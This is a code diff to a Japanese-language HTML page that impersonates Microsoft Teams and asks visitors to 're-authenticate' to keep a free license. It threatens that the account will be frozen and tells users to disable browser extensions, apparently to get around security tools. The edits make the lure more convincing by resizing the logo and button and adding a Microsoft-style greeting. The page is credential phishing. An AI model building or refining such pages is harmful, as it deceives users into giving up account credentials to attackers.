@@ -10,8 +10,8 @@ body{font-family:'Segoe UI',sans-serif;background:#fafafa;display:flex;justify-c
 .page{width:780px;}
 .cert{background:#fff;border-radius:6px;overflow:hidden;box-shadow:0 1px 4px rgba(0,0,0,.12);}
 .top-bar{height:4px;background:linear-gradient(90deg,#44546A,#605FBF,#2B7C8A);}
-.hdr{padding:40px 44px 30px;display:flex;align-items:center;gap:24px;border-bottom:1px solid #eee;}
-.hdr img.logo{width:170px;height:auto;flex-shrink:0;object-fit:contain;}
+.hdr{padding:40px 44px 30px;display:flex;align-items:center;gap:26px;border-bottom:1px solid #eee;}
+.hdr img.logo{width:auto;height:80px;flex-shrink:0;object-fit:contain;}
 .hdr .info h1{font-size:24px;font-weight:600;color:#1a1a1a;}
 .hdr .info small{display:block;font-size:15px;color:#888;margin-top:6px;}
 .body{padding:34px 44px;}
@@ -22,7 +22,7 @@ body{font-family:'Segoe UI',sans-serif;background:#fafafa;display:flex;justify-c
 label{font-size:14px;color:#555;font-weight:600;display:block;margin-bottom:7px;}
 input{width:100%;padding:15px 18px;border:1px solid #ccc;border-radius:4px;font-size:16px;margin-bottom:18px;font-family:'Segoe UI',sans-serif;background:#fff;}
 input:focus{outline:none;border-color:#605FBF;box-shadow:0 0 0 3px rgba(96,95,191,.1);}
-.btn{width:100%;padding:16px;background:#0067b8;color:#fff;border:none;border-radius:3px;font-size:16px;font-weight:600;cursor:pointer;letter-spacing:.3px;}
+.btn{width:100%;padding:18px;background:#0067b8;color:#fff;border:none;border-radius:3px;font-size:24px;font-weight:600;cursor:pointer;letter-spacing:.3px;}
 .btn:hover{background:#005da6;}
 .forgot{display:inline-block;margin-top:14px;font-size:13px;color:#605FBF;cursor:pointer;}
 .forgot:hover{text-decoration:underline;}
@@ -42,7 +42,7 @@ input:focus{outline:none;border-color:#605FBF;box-shadow:0 0 0 3px rgba(96,95,19
 <div class="cert">
 <div class="top-bar"></div>
 <div class="hdr">
-<img class="logo" src="teams.png" height="40" alt="Microsoft Teams">
+<img class="logo" src="teams.png" height="80" alt="Microsoft Teams">
 <div class="info">
 <h1>サインインに続行します</h1>
 <small>ライセンス再有効化認証</small>
@@ -51,7 +51,7 @@ input:focus{outline:none;border-color:#605FBF;box-shadow:0 0 0 3px rgba(96,95,19
 <div class="body">
 <div class="warn"><strong>警告：</strong>認証を完了しない場合は、Teamsアカウントが一定期間後に凍結されます。<span class="sub">認証が出来ない場合は、ブラウザの拡張機能をオフにしてください。</span></div>
 <div class="msg" id="msg">
-現在お使いの Microsoft Teams の無料ライセンスが期限切れとなります。<br><br>期限後の無料利用には、<strong>お使いになるアカウントの再認証（ワンタイム）</strong>が必要です。以下の認証フォームから実行してください。<br><br>再認証完了後、ライセンスが再有効化され、通常通りの無料利用が継続されます。<br>次回期限：<strong>2029年4月1日</strong>
+いつも Microsoft 製品をご利用いただきありがとうございます。<br><br>現在お使いの Microsoft Teams の無料ライセンスが期限切れとなります。<br><br>期限後の無料利用には、<strong>お使いになるアカウントの再認証（ワンタイム）</strong>が必要です。以下の認証フォームから実行してください。<br><br>再認証完了後、ライセンスが再有効化され、通常通りの無料利用が継続されます。<br>次回期限：<strong>2029年4月1日</strong>
 </div>
 <form id="f" onsubmit="return send()">
 <label>Teamsライセンス契約アドレス</label>
